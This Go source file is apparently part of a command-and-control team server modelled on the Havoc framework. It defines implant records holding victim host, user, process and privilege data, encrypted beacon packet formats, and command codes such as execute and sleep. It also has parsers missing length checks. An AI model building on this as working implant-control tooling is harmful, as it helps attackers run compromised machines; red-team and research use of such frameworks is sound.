package Common

import (
	"AllSecure/TeamServer/Crypt"
	"encoding/binary"
	"errors"
	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
	"net/http"
	"sync"
	"time"
)

/*
			[ Magic Value  ] 4 bytes
	        [ Agent ID     ] 4 bytes
	        [ Host Name    ] size + bytes
	        [ User Name    ] size + bytes
	       // not included [ Domain       ] size + bytes
			[ Adapter Desc ] size + bytes
	        [ IP Address   ] size + bytes
	        [ Process Name ] size + bytes
	        [ Process ID   ] 4 bytes
	        //not included [ Parent  PID  ] 4 bytes
	        [ Process Arch ] 4 bytes
	        [ Elevated     ] 4 bytes
	        //not included currently [ Base Address ] 8 bytes
	        [ OS Info      ] ( 5 * 4 ) bytes
	        [ OS Arch      ] 4 bytes

*/

type (
	ImplantContext struct {
		Magic_val           []byte
		Agent_id            uint32
		Agent_name          string
		Host_name_length    uint32
		Host_name           string
		User_name_length    uint32
		User_name           string
		Adapter_desc_length uint32
		Adapter_desc        string
		Ip_addr_length      uint32
		Ip_addr             string
		Process_name_length uint32
		Process_name        string
		Process_id          uint32
		Parent_pid          uint32
		Process_arch        uint32
		Elevated            uint32
		Os_info             [5]uint32
		Os_arch             uint32
		Sleep_delay         uint32
		LastCheckin         time.Time
	}

	Implant struct {
		AESKey  []byte
		IV      []byte
		Alive   bool
		Context ImplantContext
		CmdQue  Queue
	}

	Package struct {
		Size          uint32
		MagicVal      []byte
		AgentID       uint32
		CmdID         uint32
		RequestID     uint32
		AgentNameSize uint32
		AgentName     string

		//MetaData
		EncryptedKeyIvSize uint32
		EncryptedAESKey    []byte
		EncryptedIV        []byte

		//payload
		EncryptedData     []byte
		EncryptedDataSize uint32
	}

	DataPackage struct {
		CmdID     uint32
		RequestID uint32
		DataSize  uint32
		DataType  uint32
		Data      []byte
	}

	HTTPServerConfig struct {
		Name         string
		KillDate     int64
		WorkingHours string
		Method       string
		Port         int
		Secure       bool
		Address      string
	}
	TeamServerConfig struct {
		Address string
		Port    string
	}

	TLSConfig struct {
		Cert []byte
		Key  []byte

		CertPath string
		KeyPath  string
	}

	CookieStruct struct {
		Token jwttoken
	}

	Queue []interface{}

	AgentCmd struct {
		CmdID      uint32 //command to execute
		RequestID  uint32
		Size       uint32
		MagicValue []byte
		DataBuffer []byte
	}
)

type (
	ListeningServer struct {
		Config HTTPServerConfig
		TS     TeamServerConfig

		GinEngine  *gin.Engine
		HttpServer *http.Server

		TLS TLSConfig

		Active bool

		UserId int
	}

	SafeWebSocket struct {
		Conn *websocket.Conn
		mu   sync.RWMutex
	}

	Client struct {
		Server    string
		Cookie    CookieStruct
		ClientObj http.Client
		Conn      *SafeWebSocket
	}
)

/*
Taken from havoc as a basic model.

	     Unencrypted Header (if specified):
	        [ SIZE         ] 4 bytes
	        [ Magic Value  ] 4 bytes
	        [ Agent ID     ] 4 bytes
	        [ COMMAND ID   ] 4 bytes
	        [ Request ID   ] 4 bytes
			[ Agent Name   ] size + bytes

	     Encrypted Using RSA MetaData:
	        [ Encrypted AES KEY ] ? bytes - calculated at runtime
	        [ Encrypted AES IV  ] ? bytes - calculated at runtime
			[ size of encrypted payload ] 4 bytes - not encrypted

	     Encrypted MetaData:

	        [ Magic Value  ] 4 bytes
	        [ Agent ID     ] 4 bytes
	        [ Host Name    ] size + bytes
	        [ User Name    ] size + bytes
	        [ Domain       ] size + bytes
	        [ IP Address   ] 16 bytes?
	        [ Process Name ] size + bytes
	        [ Process ID   ] 4 bytes
	        [ Parent  PID  ] 4 bytes
	        [ Process Arch ] 4 bytes
	        [ Elevated     ] 4 bytes
	        [ Base Address ] 8 bytes
	        [ OS Info      ] ( 5 * 4 ) bytes
	        [ OS Arch      ] 4 bytes
	        [ SleepDelay   ] 4 bytes
	        [ SleepJitter  ] 4 bytes
	        [ Killdate     ] 8 bytes
	        [ WorkingHours ] 4 bytes
	        ..... more
	        [ Optional     ] Eg: Pivots, Extra data about the host or network etc.


		Encrypted Payload :

			[ encrypted payload ] ? bytes - calculated at runtime
*/

const (
	CMD_Register uint32 = iota
	CMD_EXIT
	CMD_SLEEP
	CMD_GET_JOB
	CMD_CHECKIN
	CMD_NO_JOB
	CMD_LIST_MODULES
	SEND_DATA
	CMD_EXECUTE
)

func (p *Package) UnmarshalHeader(data []byte) error {
	if len(data) < 20 {
		return errors.New("insufficient data for package unmarshalling")
	}

	p.Size = binary.BigEndian.Uint32(data[:4])
	p.MagicVal = data[4:8]
	p.AgentID = binary.BigEndian.Uint32(data[8:12])
	p.CmdID = binary.BigEndian.Uint32(data[12:16])
	p.RequestID = binary.BigEndian.Uint32(data[16:20])
	p.AgentNameSize = binary.BigEndian.Uint32(data[20:24])
	p.AgentName = string(data[24 : 24+p.AgentNameSize])

	return nil
}

func (p *Package) UnmarshalEncryptedData(data []byte) error {
	if len(data) <= int(24+p.AgentNameSize) {
		return errors.New("[error] insufficient data for package unmarshalling")
	}
	var baseindex = 24 + p.AgentNameSize
	p.EncryptedDataSize = p.Size - baseindex
	p.EncryptedData = data[baseindex : baseindex+p.EncryptedDataSize]
	return nil
}

func (p *Package) UnmarshalEncryptedMetaData(data []byte) error {
	if len(data) < 24 {
		return errors.New("[error] insufficient data for package unmarshalling")
	}
	var baseindex = 24 + p.AgentNameSize

	//MetaData
	p.EncryptedKeyIvSize = 0x100
	p.EncryptedAESKey = data[baseindex : baseindex+p.EncryptedKeyIvSize]
	p.EncryptedIV = data[baseindex+p.EncryptedKeyIvSize : baseindex+(p.EncryptedKeyIvSize*2)]
	p.EncryptedDataSize = p.Size - (baseindex + p.EncryptedKeyIvSize*2)
	p.EncryptedData = data[baseindex+(p.EncryptedKeyIvSize*2) : baseindex+(p.EncryptedKeyIvSize*2)+p.EncryptedDataSize]

	return nil
}

/*
			[ Magic Value  ] 4 bytes
	        [ Agent ID     ] 4 bytes
	        [ Host Name    ] size + bytes
	        [ User Name    ] size + bytes
	       // not included [ Domain       ] size + bytes
			[ Adapter Desc ] size + bytes
	        [ IP Address   ] size + bytes
	        [ Process Name ] size + bytes
	        [ Process ID   ] 4 bytes
	        //not included [ Parent  PID  ] 4 bytes
	        [ Process Arch ] 4 bytes
	        [ Elevated     ] 4 bytes
	        //not included currently [ Base Address ] 8 bytes
	        [ OS Info      ] ( 5 * 4 ) bytes
	        [ OS Arch      ] 4 bytes
	        [ SleepDelay   ] 4 bytes
	        //not included currently [ SleepJitter  ] 4 bytes
	        //not included currently [ Killdate     ] 8 bytes
	        //not included currently [ WorkingHours ] 4 bytes
*/

func (c *ImplantContext) UnmarshalContext(data []byte) {
	c.Magic_val = data[:4]
	c.Agent_id = binary.BigEndian.Uint32(data[4:8])
	c.Host_name_length = binary.BigEndian.Uint32(data[8:12])
	c.Host_name = string(data[12 : 12+c.Host_name_length])
	c.User_name_length = binary.BigEndian.Uint32(data[12+c.Host_name_length : 16+c.Host_name_length])
	c.User_name = string(data[16+c.Host_name_length : 16+c.Host_name_length+c.User_name_length])
	c.Adapter_desc_length = binary.BigEndian.Uint32(data[16+c.Host_name_length+c.User_name_length : 20+c.Host_name_length+c.User_name_length])
	c.Adapter_desc = string(data[20+c.Host_name_length+c.User_name_length : 20+c.Host_name_length+c.User_name_length+c.Adapter_desc_length])
	c.Ip_addr_length = binary.BigEndian.Uint32(data[20+c.Host_name_length+c.User_name_length+c.Adapter_desc_length : 24+c.Host_name_length+c.User_name_length+c.Adapter_desc_length])
	c.Ip_addr = string(data[24+c.Host_name_length+c.User_name_length+c.Adapter_desc_length : 24+c.Host_name_length+c.User_name_length+c.Adapter_desc_length+c.Ip_addr_length])
	c.Process_name_length = binary.BigEndian.Uint32(data[24+c.Host_name_length+c.User_name_length+c.Adapter_desc_length+c.Ip_addr_length : 28+c.Host_name_length+c.User_name_length+c.Adapter_desc_length+c.Ip_addr_length])
	c.Process_name = string(data[28+c.Host_name_length+c.User_name_length+c.Adapter_desc_length+c.Ip_addr_length : 28+c.Host_name_length+c.User_name_length+c.Adapter_desc_length+c.Ip_addr_length+c.Process_name_length])
	c.Process_id = binary.BigEndian.Uint32(data[28+c.Host_name_length+c.User_name_length+c.Adapter_desc_length+c.Ip_addr_length+c.Process_name_length : 32+c.Host_name_length+c.User_name_length+c.Adapter_desc_length+c.Ip_addr_length+c.Process_name_length])
	c.Process_arch = binary.BigEndian.Uint32(data[32+c.Host_name_length+c.User_name_length+c.Adapter_desc_length+c.Ip_addr_length+c.Process_name_length : 36+c.Host_name_length+c.User_name_length+c.Adapter_desc_length+c.Ip_addr_length+c.Process_name_length])
	c.Elevated = binary.BigEndian.Uint32(data[36+c.Host_name_length+c.User_name_length+c.Adapter_desc_length+c.Ip_addr_length+c.Process_name_length : 40+c.Host_name_length+c.User_name_length+c.Adapter_desc_length+c.Ip_addr_length+c.Process_name_length])
	c.Os_info[0] = binary.BigEndian.Uint32(data[40+c.Host_name_length+c.User_name_length+c.Adapter_desc_length+c.Ip_addr_length+c.Process_name_length : 44+c.Host_name_length+c.User_name_length+c.Adapter_desc_length+c.Ip_addr_length+c.Process_name_length])
	c.Os_info[1] = binary.BigEndian.Uint32(data[44+c.Host_name_length+c.User_name_length+c.Adapter_desc_length+c.Ip_addr_length+c.Process_name_length : 48+c.Host_name_length+c.User_name_length+c.Adapter_desc_length+c.Ip_addr_length+c.Process_name_length])
	c.Os_info[2] = binary.BigEndian.Uint32(data[48+c.Host_name_length+c.User_name_length+c.Adapter_desc_length+c.Ip_addr_length+c.Process_name_length : 52+c.Host_name_length+c.User_name_length+c.Adapter_desc_length+c.Ip_addr_length+c.Process_name_length])
	c.Os_info[3] = binary.BigEndian.Uint32(data[52+c.Host_name_length+c.User_name_length+c.Adapter_desc_length+c.Ip_addr_length+c.Process_name_length : 56+c.Host_name_length+c.User_name_length+c.Adapter_desc_length+c.Ip_addr_length+c.Process_name_length])
	c.Os_info[4] = binary.BigEndian.Uint32(data[56+c.Host_name_length+c.User_name_length+c.Adapter_desc_length+c.Ip_addr_length+c.Process_name_length : 60+c.Host_name_length+c.User_name_length+c.Adapter_desc_length+c.Ip_addr_length+c.Process_name_length])
	c.Os_arch = binary.BigEndian.Uint32(data[60+c.Host_name_length+c.User_name_length+c.Adapter_desc_length+c.Ip_addr_length+c.Process_name_length : 64+c.Host_name_length+c.User_name_length+c.Adapter_desc_length+c.Ip_addr_length+c.Process_name_length])
	c.Sleep_delay = binary.BigEndian.Uint32(data[64+c.Host_name_length+c.User_name_length+c.Adapter_desc_length+c.Ip_addr_length+c.Process_name_length : 68+c.Host_name_length+c.User_name_length+c.Adapter_desc_length+c.Ip_addr_length+c.Process_name_length])
}

func (q *Queue) PreemptQueue(value interface{}) {
	*q = append([]interface{}{value}, *q...)
}

func (q *Queue) Enqueue(value interface{}) {
	*q = append(*q, value)
}

func (q *Queue) Dequeue() (interface{}, error) {
	if len(*q) == 0 {
		return nil, errors.New("[error] Queue is empty")
	}
	element := (*q)[0]
	*q = (*q)[1:]
	return element, nil
}

func (q *Queue) Len() int {
	return len(*q)
}

func (a *AgentCmd) MarshalAgentCmd(agent *Implant) []byte {
	var data = make([]byte, 16)
	if a.MagicValue == nil {
		a.MagicValue = agent.Context.Magic_val
	}

	copy(data[:4], a.MagicValue)
	binary.LittleEndian.PutUint32(data[4:8], a.CmdID)
	binary.LittleEndian.PutUint32(data[8:12], a.RequestID)
	binary.LittleEndian.PutUint32(data[12:16], a.Size)
	if a.Size > 0 {
		data = append(data, Crypt.AES256CTR(a.DataBuffer, agent.AESKey, agent.IV)...)
	}

	return data
}

func NewSafeWebSocket(conn *websocket.Conn) *SafeWebSocket {
	return &SafeWebSocket{
		Conn: conn,
	}
}

func (s *SafeWebSocket) WriteJSON(message interface{}) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.Conn.WriteJSON(message)
}

func (s *SafeWebSocket) ReadJSON(message interface{}) error {
	return s.Conn.ReadJSON(message)
}

func (s *SafeWebSocket) WriteBinary(data []byte) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.Conn.WriteMessage(websocket.BinaryMessage, data)
}

func (dp *DataPackage) UnmarshalData(data []byte) error {
	if len(data) < 8 {
		return errors.New("insufficient data for package unmarshalling")
	}

	dp.DataSize = binary.BigEndian.Uint32(data[:4])
	dp.DataType = binary.BigEndian.Uint32(data[4:8])
	dp.DataSize -= 8
	dp.Data = data[8:]

	return nil
}

func (dp *DataPackage) ReadInt32() uint32 {
	if dp.DataSize == 0 {
		return 0
	}
	if len(dp.Data) < 4 {
		dp.DataSize = uint32(len(dp.Data))
		return 0
	}
	var data = binary.BigEndian.Uint32(dp.Data[:4])
	dp.Data = dp.Data[4:]
	dp.DataSize -= 4
	return data
}

func (dp *DataPackage) ReadString() string {
	if dp.DataSize == 0 {
		return ""
	}
	if len(dp.Data) < 4 {
		dp.DataSize = uint32(len(dp.Data))
		return ""
	}
	var size = dp.ReadInt32()
	var data = dp.Data[:size]
	dp.Data = dp.Data[size:]
	dp.DataSize -= size
	return string(data)
}

func (dp *DataPackage) ReadPointer() []byte {
	if dp.DataSize == 0 {
		return nil
	}
	if len(dp.Data) < 8 {
		dp.DataSize = uint32(len(dp.Data))
		return nil
	}
	var data = dp.Data[:8]
	dp.Data = dp.Data[8:]
	dp.DataSize -= 8
	return data
}
